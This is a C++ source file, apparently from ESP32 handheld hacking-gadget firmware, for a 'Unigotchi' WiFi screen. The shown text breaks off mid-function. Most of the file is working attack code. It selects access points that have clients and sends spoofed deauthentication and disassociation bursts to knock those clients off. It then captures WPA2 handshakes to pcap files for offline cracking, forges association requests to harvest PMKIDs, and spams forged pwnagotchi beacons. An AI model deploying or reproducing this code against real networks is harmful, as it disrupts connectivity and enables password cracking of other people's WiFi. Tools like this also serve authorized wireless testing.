#include "WifiUnigotchiScreen.h"

#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "core/ConfigManager.h"
#include "utils/StorageUtil.h"
#include "utils/HackerHead.h"
#include "ui/actions/InputSelectAction.h"

#include <WiFi.h>
#include <cstring>
#include <cstdio>

// ── Static definitions ────────────────────────────────────────────────────────

const char* WifiUnigotchiScreen::SAVE_DIR = "/unigeek/wifi/eapol";
const char* WifiUnigotchiScreen::PWN_FILE = "/unigeek/wifi/pwngrid.txt";
const uint8_t WifiUnigotchiScreen::HOP_ORDER[HOP_COUNT] =
    {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};

WifiUnigotchiScreen::RawCapture WifiUnigotchiScreen::_ring[RING_SIZE] = {};
volatile int WifiUnigotchiScreen::_ringHead = 0;
volatile int WifiUnigotchiScreen::_ringTail = 0;

WifiUnigotchiScreen::ClientSight WifiUnigotchiScreen::_cring[CRING] = {};
volatile int WifiUnigotchiScreen::_cHead = 0;
volatile int WifiUnigotchiScreen::_cTail = 0;

std::unordered_map<WifiUnigotchiScreen::MacAddr, WifiUnigotchiScreen::EapolEntry,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_eapolMap = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::string,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_ssidMap = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::vector<std::vector<uint8_t>>,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_pending = {};
std::unordered_map<WifiUnigotchiScreen::MacAddr, std::vector<uint8_t>,
                   WifiUnigotchiScreen::MacHash, WifiUnigotchiScreen::MacEqual>
    WifiUnigotchiScreen::_beaconStore = {};

WifiUnigotchiScreen::ApTarget WifiUnigotchiScreen::_apTargets[MAX_TARGETS] = {};
int WifiUnigotchiScreen::_apCount = 0;

// ── PCAP structs ──────────────────────────────────────────────────────────────
#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic = 0xA1B2C3D4; uint16_t vmaj = 2; uint16_t vmin = 4;
  int32_t tz = 0; uint32_t sig = 0; uint32_t snap = 65535; uint32_t linktype = 105;
};
struct PcapPktHdr { uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len; };
#pragma pack(pop)

// ── EAPOL message parser (M1..M4) ──────────────────────────────────────────────
static int _parseEapolMsg(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
    if (!match) continue;
    const uint8_t* e = data + i + 8;
    if (len < i + 8 + 49) return 0;
    if (e[1] != 0x03 || e[4] != 0x02) return 0;
    uint16_t ki = ((uint16_t)e[5] << 8) | e[6];
    bool ack = (ki & 0x0080), mic = (ki & 0x0100), secure = (ki & 0x0200);
    if (ack && !mic) return 1;          // M1
    if (ack &&  mic) return 3;          // M3
    if (!ack && mic) return secure ? 4 : 2;  // M4 sets the Secure bit, M2 doesn't (matches oink)
    return 0;
  }
  return 0;
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

WifiUnigotchiScreen::~WifiUnigotchiScreen() {
  _stopRadio();
  _eapolMap.clear(); _ssidMap.clear(); _pending.clear(); _beaconStore.clear();
  _apCount = 0; _ringHead = _ringTail = 0; _cHead = _cTail = 0;
}

void WifiUnigotchiScreen::onInit() {
  _eapolMap.clear(); _ssidMap.clear(); _pending.clear(); _beaconStore.clear();
  _apCount = 0; _ringHead = _ringTail = 0; _cHead = _cTail = 0;
  _handshakes = _pmkids = _deauths = _disassocs = _pwngridTx = 0;
  _mode = MODE_PASSIVE; _auto = ST_RECON; _targetIdx = -1;
  _hopIdx = 0; _channel = HOP_ORDER[0];
  for (int i = 1; i < 6; i++) _spoofMac[i] = (uint8_t)random(256);
  _spoofMac[0] = 0x02;   // locally-administered, unicast
  _lastProbeMs = 0;

  const unsigned long now = millis();
  _sessionStart = now; _chanHopUntil = now + 500;
  _lastAnimMs = _lastMoodMs = now; _lastFreeCheck = 0; _animFrame = 0;

  _storageOk = false;
  if (Uni.Storage && Uni.Storage->isAvailable() && StorageUtil::hasSpace()) {
    Uni.Storage->makeDir(SAVE_DIR);
    _storageOk = true;
  }

  _faceMood = MoodFace::EXCITED; _faceColor = TFT_GREEN;
  _history[0][0] = _history[1][0] = '\0';
  strncpy(_curMsg, "Hi! I'm Unigotchi!", sizeof(_curMsg) - 1);
  _curMsg[sizeof(_curMsg) - 1] = '\0';
  _typePos = 0; _lastCharMs = now;
  _firstRender = true; _dirty = D_ALL;

  _startRadio();
}

void WifiUnigotchiScreen::onRestore() { _firstRender = true; _dirty = D_ALL; render(); }

void WifiUnigotchiScreen::applyMode(uint8_t m) {
  _mode = (Mode)m;
  esp_wifi_set_promiscuous(_mode != MODE_PWNGRID);
  _auto = ST_RECON; _targetIdx = -1;
  if (_mode == MODE_PWNGRID) { _loadPwnNames(); _say(MoodFace::HAPPY, TFT_CYAN, "Let's make friends!"); }
  else if (_mode == MODE_ACTIVE) _say(MoodFace::LOOKING, TFT_CYAN, "Hunting handshakes!");
  else _say(MoodFace::LOOKING, TFT_CYAN, MoodMsg::looking());
  _dirty |= D_TOP | D_STATS;
}

// ── Radio ─────────────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_startRadio() {
  _attacker = new WifiAttackUtil();
  _attacker->setChannel(_channel);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&WifiUnigotchiScreen::_promiscuousCb);
}
void WifiUnigotchiScreen::_stopRadio() {
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
  if (_attacker) { delete _attacker; _attacker = nullptr; }
}

// ── Main loop ───────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::onUpdate() {
  const unsigned long now = millis();

  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK) { Screen.goBack(); return; }
    if (dir == INavigation::DIR_PRESS) { _openModeMenu(); return; }
  }

  if (_mode == MODE_PWNGRID) {
    if (now >= _chanHopUntil) { _hopNext(); _pwngridAdvertise(_channel); }
  } else {
    _runHunt();
  }

  // blink
  if (_animFrame == 0) {
    if (now - _lastAnimMs > 3500) { _animFrame = 1; _lastAnimMs = now; _dirty |= D_HEAD; }
  } else {
    if (now - _lastAnimMs > 150)  { _animFrame = 0; _lastAnimMs = now; _dirty |= D_HEAD; }
  }

  // typing reveal of the current bubble message
  int mlen = (int)strlen(_curMsg);
  if (_typePos < (uint8_t)mlen && now - _lastCharMs > 45) {
    _typePos++; _lastCharMs = now; _dirty |= D_BUBBLE;
  }

  if (_mode != MODE_PWNGRID && _auto == ST_RECON && now - _lastMoodMs > 7000)
    _say(MoodFace::LOOKING, TFT_CYAN, MoodMsg::looking());

  if (_dirty) onRender();
}

void WifiUnigotchiScreen::_openModeMenu() {
  static const InputSelectAction::Option opts[] = {
    {"Passive Mode", "0"}, {"Active Mode", "1"}, {"Pwngrid spam", "2"} };
  char cur[2]; snprintf(cur, sizeof(cur), "%d", (int)_mode);
  const char* r = InputSelectAction::popup("Mode", opts, 3, cur);
  if (r) applyMode((uint8_t)atoi(r));
  _firstRender = true; _dirty = D_ALL;
  render();   // repaint chrome + body over the dismissed box
}

// ── State machine ─────────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_hopNext() {
  _hopIdx  = (_hopIdx + 1) % HOP_COUNT;
  _channel = HOP_ORDER[_hopIdx];
  if (_attacker) _attacker->setChannel(_channel);
  // Passive has no deauth, so it must dwell long enough to catch an organic
  // handshake; active scans fast (it locks once a target appears); pwngrid sprays.
  unsigned long dwell = (_mode == MODE_PASSIVE) ? 2500 : (_mode == MODE_PWNGRID) ? 300 : 600;
  _chanHopUntil = millis() + dwell;
  _dirty |= D_TOP;   // CH is shown in the top line
}

int WifiUnigotchiScreen::_pickTarget() {
  const unsigned long now = millis();
  int best = -1; int bestScore = -1000;
  for (int i = 0; i < _apCount; i++) {
    if (_apTargets[i].attempted) continue;
    if (_apTargets[i].clientCount == 0) continue;
    if (now - _apTargets[i].lastClientMs > 12000) continue;
    int score = _apTargets[i].rssi + _apTargets[i].clientCount * 4;
    if (score > bestScore) { bestScore = score; best = i; }
  }
  if (best < 0) {
    static unsigned long lastReset = 0;
    if (now - lastReset > 30000) {
      for (int i = 0; i < _apCount; i++) _apTargets[i].attempted = false;
      lastReset = now;
    }
  }
  return best;
}

String WifiUnigotchiScreen::_ssidForIdx(int idx) {
  if (idx < 0 || idx >= _apCount) return String("(hidden)");
  MacAddr mac; memcpy(mac.data(), _apTargets[idx].bssid, 6);
  auto it = _ssidMap.find(mac);
  if (it != _ssidMap.end() && !it->second.empty()) return String(it->second.c_str());
  char b[18]; snprintf(b, sizeof(b), "%02X%02X%02X", _apTargets[idx].bssid[3],
                       _apTargets[idx].bssid[4], _apTargets[idx].bssid[5]);
  return String(b);
}

void WifiUnigotchiScreen::_runHunt() {
  const unsigned long now = millis();
  _flush();

  if (_mode == MODE_PASSIVE) {
    if (now >= _chanHopUntil) _hopNext();
    return;
  }

  switch (_auto) {
    case ST_RECON: {
      if (now >= _chanHopUntil) _hopNext();
      _probePmkid();   // active clientless PMKID harvesting while scanning
      int t = _pickTarget();
      if (t >= 0) {
        _targetIdx = t;
        _channel   = _apTargets[t].channel;
        if (_attacker) _attacker->setChannel(_channel);
        _auto = ST_LOCK; _stateUntil = now + 1200;
        _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::apSelected(_ssidForIdx(t)));
      }
      break;
    }
    case ST_LOCK:
      if (now >= _stateUntil) _auto = ST_ATTACK;
      break;
    case ST_ATTACK:
      // Fire ONE deauth burst, then go quiet and LISTEN. The client needs the
      // channel free to reconnect and complete the 4-way handshake — hammering
      // deauth the whole time would keep kicking it before it can finish.
      _hsAtAttack  = _handshakes;
      _attackTarget(true);
      _auto = ST_WAIT; _stateUntil = now + 15000; _reDeauthDone = false;  // 15 s window (oink)
      break;
    case ST_WAIT:
      // Success: a handshake landed (message already shown) — move on early.
      if (_handshakes != _hsAtAttack) {
        if (_targetIdx >= 0 && _targetIdx < _apCount) _apTargets[_targetIdx].attempted = true;
        _targetIdx = -1; _auto = ST_RECON; _chanHopUntil = now;
        break;
      }
      // One extra nudge at the mid-point if the first deauth was missed, then stay quiet.
      if (!_reDeauthDone && now >= _stateUntil - 4500) { _attackTarget(false); _reDeauthDone = true; }
      if (now >= _stateUntil) {
        if (_targetIdx >= 0 && _targetIdx < _apCount) {
          _apTargets[_targetIdx].attempted = true;
          _say(MoodFace::SAD, TFT_BLUE, MoodMsg::attackFailed(_ssidForIdx(_targetIdx)));
        }
        _targetIdx = -1; _auto = ST_RECON; _chanHopUntil = now;
      }
      break;
  }
}

void WifiUnigotchiScreen::_attackTarget(bool announce) {
  if (_targetIdx < 0 || _targetIdx >= _apCount) return;
  ApTarget& ap = _apTargets[_targetIdx];
  static const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

  for (uint8_t c = 0; c < ap.clientCount; c++) {
    // Burst of DEAUTH_BURST frames per client, bidirectional, with jitter (oink).
    for (uint8_t b = 0; b < DEAUTH_BURST; b++) {
      // AP -> client (spoof the AP), Reason 7 = class-3 frame from nonassoc STA
      _txMgmt(0xC0, ap.clients[c], ap.bssid, ap.bssid, 7); _deauths++;
      delayMicroseconds(random(700, 2400));
      // client -> AP (bidirectional — some stacks honor only one direction)
      _txMgmt(0xC0, ap.bssid, ap.clients[c], ap.bssid, 1); _deauths++;
      delayMicroseconds(random(700, 2400));
    }
    // disassoc the client, Reason 8 = STA leaving
    _txMgmt(0xA0, ap.clients[c], ap.bssid, ap.bssid, 8); _disassocs++;
    delayMicroseconds(random(700, 2400));
  }
  _txMgmt(0xC0, bcast, ap.bssid, ap.bssid, 7); _deauths++;
  delayMicroseconds(random(700, 2400));
  _txMgmt(0xA0, bcast, ap.bssid, ap.bssid, 8); _disassocs++;

  if (announce) _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::deauthing(_ssidForIdx(_targetIdx)));
  _dirty |= D_STATS;
}

void WifiUnigotchiScreen::_txMgmt(uint8_t subtype, const uint8_t* dst, const uint8_t* src,
                                  const uint8_t* bssid, uint8_t reason) {
  uint8_t f[26] = { subtype, 0x00, 0x3a, 0x01,
                    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
                    0x00, 0x00, reason, 0x00 };
  memcpy(f + 4, dst, 6); memcpy(f + 10, src, 6); memcpy(f + 16, bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
}

// Active (clientless) PMKID: send an 802.11 association request carrying an RSN
// IE (PSK/CCMP) so a WPA2 AP volunteers an EAPOL M1 with a PMKID, addressed to
// our spoofed STA MAC — captured by the promiscuous path like any other M1.
void WifiUnigotchiScreen::_sendAssocRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
  if (ssidLen == 0 || ssidLen > 32) return;
  uint8_t f[128]; size_t n = 0;
  f[n++] = 0x00; f[n++] = 0x00;                 // FC: mgmt, assoc request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  memcpy(f + n, bssid, 6);     n += 6;          // addr1 = AP
  memcpy(f + n, _spoofMac, 6); n += 6;          // addr2 = our spoofed STA
  memcpy(f + n, bssid, 6);     n += 6;          // addr3 = BSSID
  f[n++] = 0x00; f[n++] = 0x00;                 // seq-ctl
  f[n++] = 0x31; f[n++] = 0x00;                 // capability: ESS + Privacy + ShortPreamble
  f[n++] = 0x0A; f[n++] = 0x00;                 // listen interval
  f[n++] = 0x00; f[n++] = ssidLen; memcpy(f + n, ssid, ssidLen); n += ssidLen;  // SSID IE
  static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  // RSN IE: PSK / CCMP — prompts the AP to start the 4-way and emit M1 (with PMKID)
  static const uint8_t rsn[] = {
    0x30, 0x14, 0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,             // group cipher: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // pairwise: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
    0x00, 0x00 };                        // RSN capabilities
  memcpy(f + n, rsn, sizeof(rsn)); n += sizeof(rsn);
  esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
}

// Probe one not-yet-probed AP on the current channel (rate-limited) for its
// PMKID — no client required.
void WifiUnigotchiScreen::_probePmkid() {
  const unsigned long now = millis();
  if (now - _lastProbeMs < 150) return;
  for (int i = 0; i < _apCount; i++) {
    ApTarget& t = _apTargets[i];
    if (t.pmkidProbed || t.channel != (uint8_t)_channel) continue;
    MacAddr mac; memcpy(mac.data(), t.bssid, 6);
    auto it = _ssidMap.find(mac);
    if (it == _ssidMap.end() || it->second.empty()) continue;   // need the SSID
    _sendAssocRequest(t.bssid, it->second.c_str(), (uint8_t)it->second.size());
    t.pmkidProbed = true;
    _lastProbeMs = now;
    return;   // one probe per tick
  }
}

// ── Pwngrid spam from SD .txt (Bruce-style) ─────────────────────────────────

void WifiUnigotchiScreen::_loadPwnNames() {
  _pwnNames.clear(); _pwnIdx = 0;
  if (Uni.Storage && Uni.Storage->isAvailable()) {
    fs::File f = Uni.Storage->open(PWN_FILE, FILE_READ);
    if (f) {
      while (f.available() && _pwnNames.size() < 64) {
        String l = f.readStringUntil('\n'); l.trim();
        if (l.length() && !l.startsWith("#")) _pwnNames.push_back(l);  // '#' = comment
      }
      f.close();
    }
  }
  if (_pwnNames.empty()) {
    // Seed a default file the user can edit on the SD card, then use it.
    static const char* def[] = {
      "unigeek was here", "pwned by unigeek", "Free WiFi (not really)",
      "handshake hunter", "(o_o) hello there", "STOP DEAUTH SKIDZ!" };
    if (Uni.Storage && Uni.Storage->isAvailable()) {
      Uni.Storage->makeDir("/unigeek/wifi");
      fs::File w = Uni.Storage->open(PWN_FILE, FILE_WRITE);
      if (w) {
        w.print("# Unigotchi pwngrid spam names — one per line.\n");
        w.print("# Each line is broadcast as the 'name' of a pwnagotchi advertisement\n");
        w.print("# beacon. Lines starting with # and blank lines are ignored.\n");
        for (auto s : def) { w.print(s); w.print('\n'); }
        w.close();
      }
    }
    for (auto s : def) _pwnNames.push_back(String(s));
  }
  _pwnLoaded = true;
}

void WifiUnigotchiScreen::_pwngridAdvertise(uint8_t ch) {
  if (!_pwnLoaded) _loadPwnNames();
  static const uint8_t hdr[] = {
    0x80, 0x00, 0x00, 0x00, 0xff,0xff,0xff,0xff,0xff,0xff,
    0xde,0xad,0xbe,0xef,0xde,0xad, 0xa1,0x00,0x64,0xe6,0x0b,0x8b,
    0x40,0x43, 0,0,0,0,0,0,0,0, 0x64,0x00, 0x11,0x04 };
  static const char* faces[] = { "(o_o)", "(>_<)", "(^_^)", "(-_-)", "(x_x)" };

  String name = _pwnNames.empty() ? String("unigeek")
                                   : _pwnNames[_pwnIdx % _pwnNames.size()];
  const char* face = faces[_pwnIdx % 5];
  _pwnIdx++;

  // JSON-escape the name (quotes/backslashes) so the beacon payload stays valid.
  String esc; esc.reserve(name.length() + 8);
  for (size_t i = 0; i < name.length(); i++) {
    char c = name[i];
    if (c == '"' || c == '\\') esc += '\\';
    if ((uint8_t)c >= 0x20) esc += c;
  }

  char json[220];
  int jl = snprintf(json, sizeof(json),
    "{\"pal\":true,\"name\":\"%s\",\"face\":\"%s\",\"epoch\":1,"
    "\"grid_version\":\"1.10.3\",\"identity\":\"unigeek-unigotchi\","
    "\"pwnd_run\":%lu,\"pwnd_tot\":%lu,\"session_id\":\"a2:00:64:e6:0b:8b\","
    "\"timestamp\":0,\"uptime\":%lu,\"version\":\"1.8.4\"}",
    esc.c_str(), face, (unsigned long)_handshakes, (unsigned long)_handshakes,
    (unsigned long)((millis() - _sessionStart) / 1000));
  if (jl <= 0) return;
  if (jl > (int)sizeof(json) - 1) jl = sizeof(json) - 1;

  uint8_t frame[sizeof(hdr) + 2 + 220];
  size_t n = sizeof(hdr); memcpy(frame, hdr, n);
  for (int i = 0; i < jl; i++) {
    if (i % 255 == 0) { frame[n++] = 0xDE; frame[n++] = (jl - i < 255) ? (uint8_t)(jl - i) : 255; }
    frame[n++] = (uint8_t)json[i];
  }
  if (_attacker) _attacker->setChannel(ch);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, n, false);
  _pwngridTx++;

  char buf[40]; snprintf(buf, sizeof(buf), "TX: %s", name.c_str());
  if (millis() - _lastMoodMs > 1500) _say(MoodFace::HAPPY, TFT_CYAN, buf);
  _dirty |= D_STATS;
}

// ── Capture engine ────────────────────────────────────────────────────────────

bool WifiUnigotchiScreen::_checkFreeSpace() {
  if (!_storageOk) return false;
  const unsigned long now = millis();
  if (now - _lastFreeCheck < 5000) return true;
  _lastFreeCheck = now;
  if (!StorageUtil::hasSpace()) { _storageOk = false; return false; }
  return true;
}

std::string WifiUnigotchiScreen::_sanitize(const std::string& s) {
  std::string out; out.reserve(s.size());
  for (char c : s) {
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '.') out += c; else out += '_';
  }
  return out;
}
std::string WifiUnigotchiScreen::_makePath(const MacAddr& bssid, const std::string& ssid) {
  char mac[13]; snprintf(mac, sizeof(mac), "%02X%02X%02X%02X%02X%02X",
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  std::string safe = _sanitize(ssid); if (safe.empty()) safe = "unknown";
  return std::string(SAVE_DIR) + "/" + mac + "_" + safe + ".pcap";
}
void WifiUnigotchiScreen::_writePcapHeader(const std::string& path) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_WRITE); if (!f) return;
  PcapGlobalHdr hdr; f.write(reinterpret_cast<uint8_t*>(&hdr), sizeof(hdr)); f.close();
}
void WifiUnigotchiScreen::_appendPcapFrame(const std::string& path, const uint8_t* data, uint16_t len) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND); if (!f) return;
  PcapPktHdr ph; const unsigned long ms = millis();
  ph.ts_sec = ms / 1000; ph.ts_usec = (ms % 1000) * 1000; ph.incl_len = len; ph.orig_len = len;
  f.write(reinterpret_cast<uint8_t*>(&ph), sizeof(ph)); f.write(data, len); f.close();
}

bool WifiUnigotchiScreen::_extractPmkid(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  int so = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool m = true; for (int k = 0; k < 8; k++) if (data[i + k] != snap[k]) { m = false; break; }
    if (m) { so = i; break; }
  }
  if (so < 0) return false;
  const uint8_t* e = data + so + 8;
  if (len < (uint16_t)(so + 8 + 99)) return false;
  uint16_t kdLen = ((uint16_t)e[97] << 8) | e[98];
  const uint8_t* kd = e + 99;
  if ((so + 8 + 99 + kdLen) > len) kdLen = len - (so + 8 + 99);
  for (uint16_t i = 0; i + 6 + 16 <= kdLen; i++) {
    if (kd[i] == 0xDD && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
      bool z = true; for (int q = 0; q < 16; q++) if (kd[i+6+q]) { z = false; break; }
      return !z;
    }
  }
  return false;
}

int WifiUnigotchiScreen::_updateValidation(EapolEntry& entry, const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  if (len < 40) return 0;
  int so = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool m = true; for (int k = 0; k < 8; k++) if (data[i + k] != snap[k]) { m = false; break; }
    if (m) { so = i; break; }
  }
  if (so < 0) return 0;
  const uint8_t* e = data + so + 8;
  if (len < (uint16_t)(so + 8 + 49)) return 0;
  if (e[1] != 0x03 || e[4] != 0x02) return 0;
  uint16_t ki = ((uint16_t)e[5] << 8) | e[6];
  bool ack = (ki & 0x0080), mic = (ki & 0x0100), secure = (ki & 0x0200);
  int msg = 0;
  if (ack && !mic) msg = 1; else if (ack && mic) msg = 3;
  else if (!ack && mic) msg = secure ? 4 : 2;  // Secure bit splits M4 from M2 (matches oink)
  if (msg == 0 || msg == 4) return msg;
  if (entry.validated) return msg;
  // Pair M1 ANonce + M2 SNonce by STA MAC. Validation is independent of storage
  // and of whether a beacon was seen — the nonces in the frames are enough.
  if (msg == 1 || msg == 3) {
    memcpy(entry.anonce, e + 17, 32); memcpy(entry.staMacM1, data + 4, 6); entry.hasAnonce = true;
    if (entry.hasM2Data && !memcmp(entry.staMacM1, entry.staMacM2, 6)) entry.validated = true;
  } else if (msg == 2) {
    memcpy(entry.m2Snonce, e + 17, 32); memcpy(entry.staMacM2, data + 10, 6); entry.hasM2Data = true;
    if (entry.hasAnonce && !memcmp(entry.staMacM1, entry.staMacM2, 6)) entry.validated = true;
  }
  return msg;
}

int WifiUnigotchiScreen::_registerApTarget(const MacAddr& bssid, uint8_t ch, int8_t rssi) {
  for (int i = 0; i < _apCount; i++) {
    if (!memcmp(_apTargets[i].bssid, bssid.data(), 6)) {
      _apTargets[i].channel = ch;
      if (rssi != 0) _apTargets[i].rssi = rssi;
      return i;
    }
  }
  if (_apCount < MAX_TARGETS) {
    ApTarget& t = _apTargets[_apCount];
    memcpy(t.bssid, bssid.data(), 6); t.channel = ch; t.rssi = rssi;
    t.clientCount = 0; t.lastClientMs = 0; t.attempted = false; t.pmkidProbed = false;
    return _apCount++;
  }
  return -1;
}

void WifiUnigotchiScreen::_addClient(const uint8_t* bssid, const uint8_t* sta, uint8_t ch, int8_t rssi) {
  MacAddr mac; memcpy(mac.data(), bssid, 6);
  int idx = _registerApTarget(mac, ch, rssi);
  if (idx < 0) return;
  ApTarget& t = _apTargets[idx];
  for (uint8_t c = 0; c < t.clientCount; c++)
    if (!memcmp(t.clients[c], sta, 6)) { t.lastClientMs = millis(); return; }
  if (t.clientCount < MAX_CLIENTS) {
    memcpy(t.clients[t.clientCount++], sta, 6);
    t.lastClientMs = millis();
  }
}

void WifiUnigotchiScreen::_onHandshake(const std::string& ssid) {
  _handshakes++;
  int nh = Achievement.inc("wifi_eapol_handshake_valid");
  if (nh == 1)  Achievement.unlock("wifi_eapol_handshake_valid");
  if (nh == 5)  Achievement.unlock("wifi_eapol_handshake_5");
  if (nh == 20) Achievement.unlock("wifi_eapol_handshake_20");
  if (nh == 50) Achievement.unlock("wifi_eapol_handshake_50");
  if (Uni.Speaker) Uni.Speaker->playNotification();   // standard capture chime
  _say(MoodFace::EXCITED, TFT_MAGENTA, MoodMsg::newHandshake(1));
  _dirty |= D_STATS;
}

void WifiUnigotchiScreen::_flush() {
  while (_cTail != _cHead) {
    const ClientSight& cs = _cring[_cTail];
    _cTail = (_cTail + 1) % CRING;
    _addClient(cs.bssid, cs.sta, cs.channel, cs.rssi);
  }

  while (_ringTail != _ringHead) {
    const RawCapture& cap = _ring[_ringTail];
    _ringTail = (_ringTail + 1) % RING_SIZE;

    if (cap.isBeacon) {
      if (_ssidMap.find(cap.bssid) == _ssidMap.end() && cap.len >= 38) {
        uint16_t pos = 36;
        while (pos + 2 <= cap.len) {
          uint8_t id = cap.data[pos], elen = cap.data[pos + 1];
          if (pos + 2 + elen > cap.len) break;
          if (id == 0 && elen > 0 && elen <= 32) {
            _ssidMap.emplace(cap.bssid, std::string(reinterpret_cast<const char*>(cap.data + pos + 2), elen));
            break;
          }
          pos += 2 + elen;
        }
      }
      _registerApTarget(cap.bssid, cap.channel, cap.rssi);

      // Keep the first beacon so a later-created capture file can include it (the
      // beacon carries the ESSID hashcat likes). Bounded so it can't grow forever.
      if (_beaconStore.find(cap.bssid) == _beaconStore.end() && _beaconStore.size() < 64)
        _beaconStore.emplace(cap.bssid, std::vector<uint8_t>(cap.data, cap.data + cap.len));

      // If a capture file is already open for this AP without a beacon, add it now.
      auto eIt = _eapolMap.find(cap.bssid);
      if (eIt != _eapolMap.end() && !eIt->second.validated && _storageOk &&
          !eIt->second.filepath.empty() && !eIt->second.beaconWritten) {
        _appendPcapFrame(eIt->second.filepath, cap.data, cap.len);
        eIt->second.beaconWritten = true;
        if (eIt->second.ssid.empty()) {
          auto s = _ssidMap.find(cap.bssid);
          if (s != _ssidMap.end()) eIt->second.ssid = s->second;
        }
      }
      continue;
    }

    // ── EAPOL frame ──────────────────────────────────────────────────────────
    auto& entry = _eapolMap[cap.bssid];
    if (entry.validated) continue;
    auto ssidIt = _ssidMap.find(cap.bssid);
    if (ssidIt != _ssidMap.end() && entry.ssid.empty()) entry.ssid = ssidIt->second;

    if (_parseEapolMsg(cap.data, cap.len) == 1 && !entry.pmkidSeen &&
        _extractPmkid(cap.data, cap.len)) {
      entry.pmkidSeen = true; _pmkids++;
      if (Uni.Speaker) Uni.Speaker->beep();
      _say(MoodFace::EXCITED, TFT_ORANGE, "Got a PMKID!");
      _dirty |= D_STATS;
    }

    // Persist to PCAP if storage is available. The file is created on the first
    // EAPOL frame even when the SSID is unknown (named by BSSID), so we never
    // drop a handshake just because the beacon hasn't been seen yet.
    if (_storageOk) {
      if (entry.filepath.empty()) {
        entry.filepath = _makePath(cap.bssid, entry.ssid);
        _writePcapHeader(entry.filepath);
        auto bcnIt = _beaconStore.find(cap.bssid);
        if (bcnIt != _beaconStore.end()) {
          _appendPcapFrame(entry.filepath, bcnIt->second.data(), (uint16_t)bcnIt->second.size());
          entry.beaconWritten = true;
        }
      }
      if (!entry.filepath.empty()) _appendPcapFrame(entry.filepath, cap.data, cap.len);
    }

    // Validate from the frame contents — works even with no SD card.
    bool wasValid = entry.validated;
    _updateValidation(entry, cap.data, cap.len);
    if (!wasValid && entry.validated) { _onHandshake(entry.ssid); _beaconStore.erase(cap.bssid); }
  }
}

// ── Promiscuous callback ────────────────────────────────────────────────────────

void WifiUnigotchiScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (buf == nullptr) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const auto pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  const uint16_t fc = (uint16_t)pay[0] | ((uint16_t)pay[1] << 8);
  const uint8_t fcType = (fc & 0x000C) >> 2;
  const uint8_t fcSub  = (fc & 0x00F0) >> 4;

  if (fcType == 0 && fcSub == 8 && len >= 36) {  // beacon
    int next = (_ringHead + 1) % RING_SIZE; if (next == _ringTail) return;
    RawCapture& s = _ring[_ringHead];
    memcpy(s.bssid.data(), pay + 16, 6);
    uint16_t cl = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(s.data, pay, cl);
    s.len = cl; s.channel = pkt->rx_ctrl.channel; s.rssi = pkt->rx_ctrl.rssi; s.isBeacon = true;
    _ringHead = next; return;
  }

  if (fcType != 2) return;  // data only

  const uint8_t toDs = pay[1] & 0x01, fromDs = (pay[1] & 0x02) >> 1;
  uint8_t bssid[6], sta[6]; bool haveSta = false;
